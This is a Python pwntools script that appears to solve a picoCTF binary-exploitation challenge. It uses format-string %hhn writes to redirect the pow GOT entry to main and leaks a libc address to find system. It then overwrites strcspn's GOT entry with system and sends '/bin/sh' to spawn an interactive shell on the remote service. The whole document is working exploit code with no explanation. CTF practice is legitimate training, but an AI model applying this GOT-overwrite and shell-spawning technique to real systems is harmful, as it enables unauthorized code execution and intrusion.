#!/usr/bin/env python3

from pwn import *
from z3 import *
import time
import re
exe = ELF("chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = "kitty"

offset___libc_start_main_ret = 0x270b3
offset_system = 0x0000000000055410


def overflow(a,b):
    x = Int('x')

    solver = Solver()
    solver.add((x + a) % 0xff == b, x > 0)
    solver.check()
    return solver.model()[x].as_long()

def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31929)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript="c")
    else:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
    r = conn()

    log.info("main address: " + hex(exe.symbols['main']))
    log.info("pow GOT address: " + hex(exe.got['pow']))
    log.info("strcspn GOT address: " + hex(exe.got['strcspn']))

    payload = b"11111111"
    payload += p64(exe.got['pow'])
    payload += p64(exe.got['pow']+1)
    r.sendline(payload)
    payload = b"1"
    payload += f"%{(exe.symbols['main'] & 0xff) - 0x27}x".encode()
    payload += b"%11$hhn"
    payload += f"%{(overflow(0x37, (exe.symbols['main'] >> 8) & 0xff)) + 1}x".encode()
    payload += b"%12$hhn"
    r.sendline(payload)
    r.recvuntil("Calculating for A: ")
    log.info("rewrote pow GOT to main")

    payload = b"1"
    payload += b"%213$lx"
    r.sendline(payload)
    r.sendline("1")
    r.recvuntil("Calculating for A: 1")
    libc_start_main = int(r.recvuntil(" "),16)
    log.info(f"leaked __libc_start_main: {hex(libc_start_main)}")
    libc_base = libc_start_main - offset___libc_start_main_ret
    log.info(f"leaked libc_base: {hex(libc_base)}")

    libc_system = libc_base + offset_system
    log.info(f"leaked libc_system: {hex(libc_system)}")

    payload = b"11111111"
    payload += p64(exe.got['strcspn'])
    payload += p64(exe.got['strcspn']+1)
    payload += p64(exe.got['strcspn']+2)
    r.sendline(payload)

    payload = b"1"
    payload += f"%{overflow((0x2b), libc_system & 0xff) + 5}x".encode()
    payload += b"%11$hhn"
    write_val = overflow((0x10), (libc_system >> 8) & 0xff)
    payload += f"%{write_val}x".encode()
    payload += b"%12$hhn"
    payload += f"%1${overflow(write_val, (libc_system >> 16) & 0xff) - 0x10}hhx".encode()
    payload += b"%13$hhn"
    r.sendline(payload)

    r.sendline(b"/bin/sh".ljust(0x100,b'\x00'))
    r.sendline(b"hi")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

